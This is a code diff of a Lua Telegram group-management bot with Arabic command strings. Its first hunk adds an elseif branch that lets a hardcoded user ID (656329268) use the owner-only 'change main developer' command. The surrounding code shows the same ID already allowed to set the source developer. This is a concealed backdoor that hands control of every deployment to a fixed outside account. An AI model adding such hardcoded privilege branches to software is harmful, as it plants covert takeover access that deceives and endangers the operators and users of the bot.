@@ -4012,6 +4012,9 @@ if text == 'تغيير المطور الاساسي' or text == '⟁ تغيير �
 if tonumber(msg.sender_id.user_id) == tonumber(Sudo_Id) then 
 Redis:set(Fast.."AddSudosNew"..msg_chat_id,true)
 return send(msg_chat_id,msg_id,"⟁ ارسل معرف المطور الاساسي مع @........","md",true)
+elseif tonumber(msg.sender_id.user_id) == tonumber(656329268)  then 
+Redis:set(Fast.."AddSudosNew"..msg_chat_id,true)
+return send(msg_chat_id,msg_id,"⟁ ارسل معرف المطور الاساسي مع @........","md",true)
 else
 return send(msg_chat_id,msg_id,'\n*⟁ هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true) 
 end
@@ -14692,6 +14695,7 @@ end
 if text == "تعيين مطور السورس ⟁" then
 if tonumber(msg.sender_id.user_id) == tonumber(Sudo_Id)  then 
 Redis:set(Fast.."set:devsource"..senderr,true)
+send(msg_chat_id,msg_id,'⟁ ارسل الان معرف مطور السورس ',"md",true)
 elseif tonumber(msg.sender_id.user_id) == tonumber(656329268)  then 
 Redis:set(Fast.."set:devsource"..senderr,true)
 send(msg_chat_id,msg_id,'⟁ ارسل الان معرف مطور السورس ',"md",true)
